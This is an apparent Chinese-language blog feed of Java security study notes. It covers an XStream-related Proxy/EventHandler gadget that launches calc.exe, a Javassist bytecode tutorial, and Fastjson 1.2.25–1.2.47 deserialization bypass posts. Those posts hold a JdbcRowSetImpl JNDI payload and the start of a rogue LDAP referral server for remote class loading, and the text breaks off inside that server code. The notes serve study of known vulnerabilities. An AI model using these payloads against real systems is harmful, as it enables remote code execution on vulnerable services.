class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">HelloService</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloTrue</span>();<br>        <span class="hljs-type">EventHandler</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventHandler</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;calc.exe&quot;</span>), <span class="hljs-string">&quot;start&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">HelloService</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (HelloService) Proxy.newProxyInstance(hello.getClass().getClassLoader(), hello.getClass().getInterfaces(), start);<br>        o.Apple();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>XStream</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javasist</title>
    <link href="/2022/03/09/Javasist/"/>
    <url>/2022/03/09/Javasist/</url>
    
    <content type="html"><![CDATA[<h1 id="Javasist"><a href="#Javasist" class="headerlink" title="Javasist"></a>Javasist</h1><p><strong>可以更简单、快速的编辑和创建Java字节码的类库。我们知道 Java 字节码以二进制的形式存储在 class 文件中，每一个 class 文件包含一个 Java 类或接口。Javaassist 就是一个用来处理 Java 字节码的类库。</strong></p><p>用几个案例来学习。（从网上搜刮的，如有雷同请联系作者删除）</p><h2 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h2><h3 id="Hello类"><a href="#Hello类" class="headerlink" title="Hello类"></a>Hello类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">syaHello</span><span class="hljs-params">()</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;h3h3h3&quot;</span>);<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="主类"><a href="#主类" class="headerlink" title="主类"></a>主类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">aDefault</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> aDefault.get(<span class="hljs-string">&quot;xsw6a.Hello&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">syaHello</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;syaHello&quot;</span>);<br>        syaHello.setBody(<span class="hljs-string">&quot;System.out.println(\&quot;我要把你变成xsw6_a\&quot;);&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> ctClass.toClass();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aClass.newInstance();<br>        <span class="hljs-type">Hello</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hello</span>();<br>        hello.syaHello();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="获取类"><a href="#获取类" class="headerlink" title="获取类"></a>获取类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassPool</span> <span class="hljs-variable">aDefault</span> <span class="hljs-operator">=</span> ClassPool.getDefault(); <span class="hljs-comment">//类库，jvm中所加载的class</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> aDefault.get(<span class="hljs-string">&quot;xsw6a.Hello&quot;</span>); <span class="hljs-comment">//获取已知类</span><br></code></pre></td></tr></table></figure><h3 id="获取方法"><a href="#获取方法" class="headerlink" title="获取方法"></a>获取方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">tMethod</span> <span class="hljs-variable">syaHello</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;syaHello&quot;</span>); <span class="hljs-comment">//获取已知方法</span><br></code></pre></td></tr></table></figure><h2 id="修改方法中的类容"><a href="#修改方法中的类容" class="headerlink" title="修改方法中的类容"></a>修改方法中的类容</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">syaHello.setBody(<span class="hljs-string">&quot;System.out.println(<span class="hljs-subst">\&quot;</span>我要把你变成xsw6_a<span class="hljs-subst">\&quot;</span>);&quot;</span>); \\覆盖原始的内容。<br></code></pre></td></tr></table></figure><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>这里会完全覆盖原有方法里面的内容。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203091712635.png" alt="QQ截图20220309171203"></p><h2 id="加载修改后的类"><a href="#加载修改后的类" class="headerlink" title="加载修改后的类"></a>加载修改后的类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> ctClass.toClass(); <span class="hljs-comment">//使用当前Classloader加载修改后的类。</span><br></code></pre></td></tr></table></figure><h2 id="将其实例化"><a href="#将其实例化" class="headerlink" title="将其实例化"></a>将其实例化</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aClass.newInstance();<br><span class="hljs-type">Hello</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hello</span>();<br></code></pre></td></tr></table></figure><h2 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h2><p>个人感觉上面的Demo1用处不大，感觉类似动态代理（但是不如动态代理），但是会将原有的类的方法全部覆盖了。（纯属个人理解！！！）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo2</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException, InstantiationException, IllegalAccessException, ClassNotFoundException, SecurityException, NoSuchMethodException, IllegalArgumentException, InvocationTargetException, InvocationTargetException &#123;<br>        <span class="hljs-comment">// 创建类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;person&quot;</span>);<br><br>        <span class="hljs-comment">// 添加私有成员name及其getter、setter方法</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">param</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(pool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, cls);<br>        param.setModifiers(Modifier.PRIVATE);<br>        cls.addMethod(CtNewMethod.setter(<span class="hljs-string">&quot;setName&quot;</span>, param));<br>        cls.addMethod(CtNewMethod.getter(<span class="hljs-string">&quot;getName&quot;</span>, param));<br>        cls.addField(param, CtField.Initializer.constant(<span class="hljs-string">&quot;&quot;</span>));<br><br>        <span class="hljs-comment">// 添加无参的构造体</span><br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">cons</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[] &#123;&#125;, cls);<br>        cons.setBody(<span class="hljs-string">&quot;&#123;name = \&quot;h3h3h3h3\&quot;;&#125;&quot;</span>);<br>        cls.addConstructor(cons);<br><br>        <span class="hljs-comment">// 添加有参的构造体</span><br>        cons = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[] &#123;pool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>)&#125;, cls);<br>        cons.setBody(<span class="hljs-string">&quot;&#123;$0.name = $1;&#125;&quot;</span>);<br>        cls.addConstructor(cons);<br><br>        <span class="hljs-comment">// 打印创建类的类名</span><br>        System.out.println(cls.toClass());<br><br>        <span class="hljs-comment">// 通过反射创建无参的实例，并调用getName方法</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;person&quot;</span>).newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getter</span> <span class="hljs-operator">=</span> o.getClass().getMethod(<span class="hljs-string">&quot;getName&quot;</span>);<br>        System.out.println(getter.invoke(o));<br><br>        <span class="hljs-comment">// 调用其setName方法</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">setter</span> <span class="hljs-operator">=</span> o.getClass().getMethod(<span class="hljs-string">&quot;setName&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class&#125;);<br>        setter.invoke(o, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        System.out.println(getter.invoke(o));<br><br>        <span class="hljs-comment">// 通过反射创建有参的实例，并调用getName方法</span><br>        o = Class.forName(<span class="hljs-string">&quot;person&quot;</span>).getConstructor(String.class).newInstance(<span class="hljs-string">&quot;xsw6_a&quot;</span>);<br>        getter = o.getClass().getMethod(<span class="hljs-string">&quot;getName&quot;</span>);<br>        System.out.println(getter.invoke(o));<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>等效与这样？</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        System.out.println(<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PersonTrue</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) &#123;<br>        Person person = <span class="hljs-keyword">new</span> <span class="hljs-type">Person</span>();<br>        System.out.println(person);<br>        person.setName(<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        person.getName(<span class="hljs-string">&quot;xsw6_a&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>在后续的学习中会不断来更新的。因为我感觉这个学的有点模糊。</p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjson（1.2.25-1.2.47）</title>
    <link href="/2022/03/09/Fastjson%EF%BC%881-2-25-1-2-47%EF%BC%89/"/>
    <url>/2022/03/09/Fastjson%EF%BC%881-2-25-1-2-47%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjson1-2-25-1-2-47"><a href="#Fastjson1-2-25-1-2-47" class="headerlink" title="Fastjson1.2.25-1.2.47"></a>Fastjson1.2.25-1.2.47</h1><p>通杀版本。</p><ul><li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport不能利用</li><li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用</li></ul><p>这里还是一样要用到ldap。配置按照<strong>1.2.45</strong>所需要的环境配置。</p><h1 id="为什么这里不开启AutoTypeSupport也可以"><a href="#为什么这里不开启AutoTypeSupport也可以" class="headerlink" title="为什么这里不开启AutoTypeSupport也可以"></a>为什么这里不开启AutoTypeSupport也可以</h1><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203091302366.png" alt="QQ截图20220309123409"></p><p>没有进入黑名单删选。<br>跟进。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203091304938.png" alt="QQ截图20220309124256"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203091302374.png" alt="QQ截图20220309124530"></p><p>发现这里会将com.sun.rowset.JdbcRowSetImpl加载进缓存中。<br>就相当于这一次是利用缓存加载出<strong>com.sun.rowset.JdbcRowSetImpl</strong>绕过了各种黑名单。</p><h2 id="开启AutoTypeSupport时"><a href="#开启AutoTypeSupport时" class="headerlink" title="开启AutoTypeSupport时"></a>开启AutoTypeSupport时</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203091258692.png" alt="QQ截图20220309125840"></p><p>由于加载了缓存。这里会显示null，所以就进不去黑名单。<br>至此fastjson就告一段落。后续官方直接禁止了缓存类加载。over。</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;a\&quot;:&#123; \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;, \&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;, \&quot;b\&quot;:&#123; \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Fastjson</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjson（1.2.25-1.2.45）</title>
    <link href="/2022/03/08/Fastjson%EF%BC%881-2-25-1-2-45%EF%BC%89/"/>
    <url>/2022/03/08/Fastjson%EF%BC%881-2-25-1-2-45%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjson1-2-25-1-2-45"><a href="#Fastjson1-2-25-1-2-45" class="headerlink" title="Fastjson1.2.25-1.2.45"></a>Fastjson1.2.25-1.2.45</h1><p>这里通过<strong>JNDI+LDAP</strong>绕过。<br>创建Ldap服务需要。<br><code>unboundid-ldapsdk</code>包(<a href="https://repo1.maven.org/maven2/com/unboundid/unboundid-ldapsdk/5.1.3/unboundid-ldapsdk-5.1.3.jar)%E5%AF%BC%E5%85%A5idea%E5%B0%B1%E5%8F%AF%E3%80%82">https://repo1.maven.org/maven2/com/unboundid/unboundid-ldapsdk/5.1.3/unboundid-ldapsdk-5.1.3.jar)导入idea就可。</a></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.45<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>      <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="LDAP服务搭建"><a href="#LDAP服务搭建" class="headerlink" title="LDAP服务搭建"></a>LDAP服务搭建</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LDAPServer</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:80/#Exploit&quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1389</span>;<br><br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                    <span class="hljs-string">&quot;listen&quot;</span>,<br>                    InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                    port,<br>                    ServerSocketFactory.getDefault(),<br>                    SocketFactory.getDefault(),<br>                    (SSLSocketFactory) SSLSocketFactory.getDefault()));<br><br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url)));<br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);<br>            ds.startListening();<br><br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br><br>        <span class="hljs-keyword">private</span> URL codebase;<br><br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>        &#125;<br><br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * <span class="hljs-doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, base, e);<br>            &#125;<br>            <span 